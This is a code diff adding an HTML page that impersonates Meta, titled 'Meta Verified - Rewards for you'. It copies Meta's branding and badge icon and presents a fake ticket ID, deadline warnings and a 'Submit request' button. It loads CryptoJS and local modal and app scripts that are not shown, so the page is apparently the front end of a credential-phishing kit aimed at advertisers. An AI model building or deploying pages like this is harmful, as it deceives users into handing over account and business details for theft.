@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified - Rewards for you</title>
+    <link rel="icon" href="./public/favicon-32x32.png">
+    <link rel="stylesheet" href="./public/styles/style.css">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: 'en',
+                    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+                },
+                'google_translate_element'
+            );
+        }
+    </script>
+
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+</head>
+
+<body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen w-full flex justify-center">
+
+    <script src="./public/js/translate.js"></script>
+    <div class="absolute top-0 right-0 hidden" id="google_translate_element"></div>
+
+    <div class="max-w-[768px] w-full p-4 h-full">
+        <div class="w-full">
+            <div class="flex items-start gap-[8px] flex-col justify-start mb-[30px]">
+                <div class='flex items-center justify-start gap-[8px]'>
+                    <div class='flex items-center justify-center'>
+                        <svg width="49" height="49" viewBox="0 0 49 49" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="11" y="13" width="26" height="23" fill="white" />
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M18.2432 3.21986C21.3096 -1.07329 27.6902 -1.07329 30.7569 3.21986L31.2451 3.90334C31.7846 4.65892 32.6909 5.06349 33.6136 4.96097L35.7896 4.71917C40.687 4.17504 44.825 8.31305 44.2809 13.2103L44.0392 15.3864C43.9366 16.3092 44.3411 17.2153 45.0967 17.755L45.7802 18.2432C50.0733 21.3096 50.0733 27.6902 45.7802 30.7569L45.0967 31.2451C44.3411 31.7846 43.9366 32.6909 44.0392 33.6136L44.2809 35.7896C44.825 40.687 40.687 44.825 35.7896 44.2809L33.6136 44.0392C32.6909 43.9366 31.7846 44.3411 31.2451 45.0967L30.7569 45.7802C27.6902 50.0733 21.3099 50.0733 18.2432 45.7802L17.755 45.0967C17.2153 44.3411 16.3092 43.9366 15.3863 44.0392L13.2103 44.2809C8.31305 44.825 4.17504 40.687 4.71917 35.7896L4.96097 33.6136C5.06349 32.6909 4.65892 31.7846 3.90334 31.2451L3.21986 30.7569C-1.07329 27.6902 -1.07329 21.3099 3.21986 18.2432L3.90334 17.755C4.65892 17.2153 5.06349 16.3092 4.96097 15.3863L4.71917 13.2103C4.17504 8.31305 8.31305 4.17504 13.2103 4.71917L15.3864 4.96097C16.3092 5.06349 17.2153 4.65892 17.755 3.90334L18.2432 3.21986ZM34.0014 17.5617C35.0022 18.5626 35.0022 20.1855 34.0014 21.1863L24.2135 30.9742C22.9563 32.2316 20.9177 32.2316 19.6606 30.9742L14.9987 26.3123C13.9978 25.3115 13.9978 23.6886 14.9987 22.6877C15.9996 21.6869 17.6224 21.6869 18.6233 22.6877L21.937 26.0015L30.3768 17.5617C31.3776 16.5608 33.0005 16.5608 34.0014 17.5617Z"
+                                fill="#0081FB" />
+                        </svg>
+                    </div>
+                </div>
+                <b class="text-[2rem]">Meta Verified - Rewards for you</b>
+            </div>
+
+            <div class="w-full">
+                <div class="w-full mb-[20px]">
+                    <p class="text-[15px] mb-[0px] mt-[15px]">We’re reaching out to let you know that your business may
+                        be eligible for monthly invoicing, a payment option designed for trusted advertisers on Meta.
+                    </p>
+                    <p class="text-[15px] mb-[0px] mt-[15px]">With monthly invoicing, you can consolidate your
+                        advertising costs into a single invoice each month, helping streamline billing and reduce
+                        interruptions to ad delivery.</p>
+                    <p class="text-[16px] mb-[0px] mt-[14px] text-[#465a69]">Your ticket id: #<span
+                            id="ticketId">XXXX-XXXX-XXXX</span></p>
+                </div>
+
+                <div class="w-full">
+                    <p class="mb-[15px]"><b class="text-[17px] font-bold">Verified Blue Badge Request Guide</b></p>
+                    <p class="text-[15px] mb-[10px]">- Fact checkers may not respond to requests containing
+                        intimidation, hate speech, or verbal threats</p>
+                    <p class="text-[15px] mb-[10px]">- In your request, please provide all required information to
+                        ensure timely processing by the fact checker. Submitting an invalid email address or failing to
+                        reply to requests for additional information within 2 days may lead to the application being
+                        closed without review. If the request remains unprocessed after 4 days, Meta will automatically
+                        reject it.</p>
+                    <p class="text-[15px] mb-[10px]">- Once all details are submitted, we will evaluate your account to
+                        check for any restrictions. The verification process typically takes 24 hours, though it may
+                        extend in some cases. Based on our decision, restrictions will either remain or be lifted, and
+                        your account will be updated accordingly.</p>
+                </div>
+            </div>
+        </div>
+
+        <button id="submitRequestBtn"
+            class="bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center">
+            Submit request
+        </button>
+
+        <div class="flex items-center text-center justify-center flex-wrap text-xs mt-8 text-[#65676b] gap-4">
+            <a href="#">Help Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Community Standards</a>
+            <a href="#">Meta © 2025</a>
+        </div>
+    </div>
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- JavaScript Files -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
+</body>
+
+</html>
